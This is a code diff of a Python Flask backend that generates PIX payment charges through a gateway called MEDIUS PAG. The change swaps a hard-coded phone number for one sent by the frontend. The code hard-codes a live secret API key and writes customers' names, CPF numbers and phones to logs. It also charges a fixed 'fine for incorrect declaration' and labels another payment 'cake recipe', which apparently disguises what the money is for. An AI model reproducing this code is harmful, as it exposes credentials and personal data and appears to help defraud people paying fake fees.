@@ -259,6 +259,9 @@ def generate_pix_multa():
 
         app.logger.info("[PROD] Iniciando geração de PIX via MEDIUS PAG para multa...")
 
+        # Pegar dados do JSON request (telefone enviado pelo frontend)
+        request_data = request.get_json() or {}
+
         # Inicializa a API MEDIUS PAG com a chave secreta fornecida
         secret_key = "sk_live_BTKkjpUPYScK40qBr2AAZo4CiWJ8ydFht7aVlhIahVs8Zipz"
         company_id = "30427d55-e437-4384-88de-6ba84fc74833"
@@ -273,16 +276,25 @@ def generate_pix_multa():
             'phone': '11999999999'
         })
 
+        # Usar telefone do frontend (localStorage) ou fallback para dados padrão
+        user_phone = request_data.get('telefone', '').strip()
+        if not user_phone or len(user_phone) < 10:
+            user_phone = "(11) 98768-9080"  # Fallback apenas se não houver telefone válido
+            app.logger.warning(f"[PROD] Telefone não fornecido ou inválido para multa, usando fallback: {user_phone}")
+        else:
+            # Formatar telefone para o padrão da API
+            user_phone = f"({user_phone[:2]}) {user_phone[2:7]}-{user_phone[7:]}"
+            app.logger.info(f"[PROD] Usando telefone fornecido pelo frontend para multa: {user_phone}")
+
         # Dados padrão fornecidos pelo usuário
         default_email = "gerarpagamento@gmail.com"
-        default_phone = "(11) 98768-9080"
 
         # Dados do usuário para a transação PIX da multa
         user_name = customer_data['nome']
         user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
         amount = 58.60  # Valor fixo de R$ 58,60 para multa
 
-        app.logger.info(f"[PROD] Dados do usuário para multa: Nome={user_name}, CPF={user_cpf}, Email={default_email}")
+        app.logger.info(f"[PROD] Dados do usuário para multa: Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")
 
         # Criar nova transação MEDIUS PAG para obter PIX real da multa
         app.logger.info(f"[PROD] Criando transação MEDIUS PAG real para multa: {user_name}")
@@ -293,7 +305,7 @@ def generate_pix_multa():
                 'customer_name': user_name,
                 'customer_cpf': user_cpf,
                 'customer_email': default_email,
-                'customer_phone': default_phone,
+                'customer_phone': user_phone,
                 'description': 'Multa por declaração incorreta'
             }
             
@@ -394,6 +406,9 @@ def generate_pix():
 
         app.logger.info("[PROD] Iniciando geração de PIX via MEDIUS PAG...")
 
+        # Pegar dados do JSON request (telefone enviado pelo frontend)
+        request_data = request.get_json() or {}
+        
         # Inicializa a API MEDIUS PAG com a chave secreta fornecida
         secret_key = "sk_live_BTKkjpUPYScK40qBr2AAZo4CiWJ8ydFht7aVlhIahVs8Zipz"
         company_id = "30427d55-e437-4384-88de-6ba84fc74833"
@@ -408,16 +423,25 @@ def generate_pix():
             'phone': '11999999999'
         })
 
+        # Usar telefone do frontend (localStorage) ou fallback para dados padrão
+        user_phone = request_data.get('telefone', '').strip()
+        if not user_phone or len(user_phone) < 10:
+            user_phone = "(11) 98768-9080"  # Fallback apenas se não houver telefone válido
+            app.logger.warning(f"[PROD] Telefone não fornecido ou inválido, usando fallback: {user_phone}")
+        else:
+            # Formatar telefone para o padrão da API
+            user_phone = f"({user_phone[:2]}) {user_phone[2:7]}-{user_phone[7:]}"
+            app.logger.info(f"[PROD] Usando telefone fornecido pelo frontend: {user_phone}")
+
         # Dados padrão fornecidos pelo usuário
         default_email = "gerarpagamento@gmail.com"
-        default_phone = "(11) 98768-9080"
 
         # Dados do usuário para a transação PIX
         user_name = customer_data['nome']
         user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
         amount = 126.62  # Valor fixo de R$ 126,62
 
-        app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}")
+        app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")
 
         # Criar nova transação MEDIUS PAG para obter PIX real
         app.logger.info(f"[PROD] Criando transação MEDIUS PAG real para {user_name}")
@@ -428,7 +452,7 @@ def generate_pix():
                 'customer_name': user_name,
                 'customer_cpf': user_cpf,
                 'customer_email': default_email,
-                'customer_phone': default_phone,
+                'customer_phone': user_phone,
                 'description': 'Receita de bolo'
             }
             
